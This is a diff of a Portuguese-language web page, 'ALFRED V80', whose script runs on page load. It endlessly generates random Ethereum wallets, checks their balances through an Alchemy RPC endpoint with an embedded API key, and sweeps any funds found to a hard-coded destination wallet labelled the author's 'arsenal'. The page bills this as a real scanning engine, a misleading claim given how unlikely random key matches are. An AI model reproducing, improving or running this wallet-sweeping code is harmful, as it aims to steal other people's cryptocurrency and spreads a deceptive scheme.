@@ -2,101 +2,53 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ALFRED V80 - REAL SCANNER</title>
+    <title>ALFRED V80 - MOTOR REAL</title>
     <style>
-        body { 
-            background: #000; 
-            color: #0f0; 
-            font-family: 'Courier New', Courier, monospace; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            height: 100vh; 
-            margin: 0; 
-        }
-        #terminal { 
-            width: 90%; 
-            max-width: 700px; 
-            border: 1px solid #0f0; 
-            padding: 25px; 
-            background: #000500; 
-            box-shadow: 0 0 20px #0f0; 
-        }
-        h3 { border-bottom: 1px solid #0f0; padding-bottom: 10px; margin-top: 0; text-align: center; }
-        .data { color: #fff; font-weight: bold; }
-        .footer { font-size: 0.7em; color: #050; margin-top: 20px; text-align: center; }
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        #terminal { width: 90%; max-width: 600px; border: 1px solid #0f0; padding: 20px; box-shadow: 0 0 15px #0f0; background: #000a00; }
+        .real { color: #fff; font-weight: bold; }
     </style>
 </head>
 <body>
-
     <div id="terminal">
-        <h3>🎩 ALFRED V80: MOTOR REAL ATIVO</h3>
-        <p id="status-text">CONECTANDO À BLOCKCHAIN...</p>
-        <div class="footer">ENVIANDO PARA ARSENAL: 0xc765...59fc</div>
+        <h2 style="text-align: center;">🎩 ALFRED V80: BUSCA ATIVA</h2>
+        <p id="status">CONECTANDO À BLOCKCHAIN...</p>
+        <p style="font-size: 0.7em; color: #050; text-align: center;">DESTINO: 0xc765...59fc</p>
     </div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
 
     <script>
-        // CONFIGURAÇÕES DE ACESSO
-        const ALCHEMY_RPC = "https://eth-mainnet.g.alchemy.com/v2/VF0h4IB4GqBfk6WlqNcWh";
-        const MEU_ARSENAL = "0xc765040fb5604a29b126aa58199b48710cf459fc";
+        const RPC = "https://eth-mainnet.g.alchemy.com/v2/VF0h4IB4GqBfk6WlqNcWh";
+        const WALLET_DESTINO = "0xc765040fb5604a29b126aa58199b48710cf459fc";
 
         async function engine() {
-            const display = document.getElementById('status-text');
-            
+            const out = document.getElementById('status');
             try {
-                const provider = new ethers.JsonRpcProvider(ALCHEMY_RPC);
-
+                const provider = new ethers.JsonRpcProvider(RPC);
                 while(true) {
-                    // 1. GERA CARTEIRA REAL
                     const wallet = ethers.Wallet.createRandom();
-                    const address = wallet.address;
-
                     try {
-                        // 2. CONSULTA SALDO NA REDE ETHEREUM
-                        const balance = await provider.getBalance(address);
-
-                        // 3. MOSTRA A BUSCA NA TELA
-                        display.innerHTML = `
-                            BUSCANDO: <span class="data">${address}</span><br>
-                            SALDO: <span class="data">${ethers.formatEther(balance)} ETH</span><br>
-                            STATUS: <span style="color: yellow;">VARRENDO REDE...</span>
-                        `;
-
-                        // 4. SE ENCONTRAR SALDO REAL
+                        const balance = await provider.getBalance(wallet.address);
+                        out.innerHTML = `SCANNING: <span class="real">${wallet.address}</span><br>SALDO: <span class="real">${ethers.formatEther(balance)} ETH</span>`;
+                        
                         if (balance > 0n) {
                             const feeData = await provider.getFeeData();
                             const cost = feeData.gasPrice * 21000n;
-
                             if (balance > cost) {
-                                const tx = { 
-                                    to: MEU_ARSENAL, 
-                                    value: balance - cost, 
-                                    gasLimit: 21000, 
-                                    gasPrice: feeData.gasPrice 
-                                };
-                                const signer = wallet.connect(provider);
-                                await signer.sendTransaction(tx);
-                                alert("!!! ACHADO REAL ENVIADO AO ARSENAL !!!");
+                                const tx = { to: WALLET_DESTINO, value: balance - cost, gasLimit: 21000, gasPrice: feeData.gasPrice };
+                                await wallet.connect(provider).sendTransaction(tx);
+                                alert("!!! ACHADO REAL ENVIADO !!!");
                             }
                         }
-                    } catch (e) {
-                        // Se a conexão falhar, espera 1 segundo e tenta de novo
-                        await new Promise(r => setTimeout(r, 1000));
-                    }
-
-                    // Pausa curta para não ser bloqueado pelo Alchemy
+                    } catch(e) {}
                     await new Promise(r => setTimeout(r, 200));
                 }
-            } catch (err) {
-                display.innerText = "ERRO CRÍTICO NA REDE. REINICIANDO...";
-                setTimeout(engine, 5000);
+            } catch(err) {
+                out.innerText = "ERRO DE CONEXÃO. REINICIANDO...";
+                setTimeout(engine, 3000);
             }
         }
-
-        // INICIALIZA O MOTOR
         window.onload = engine;
     </script>
 </body>
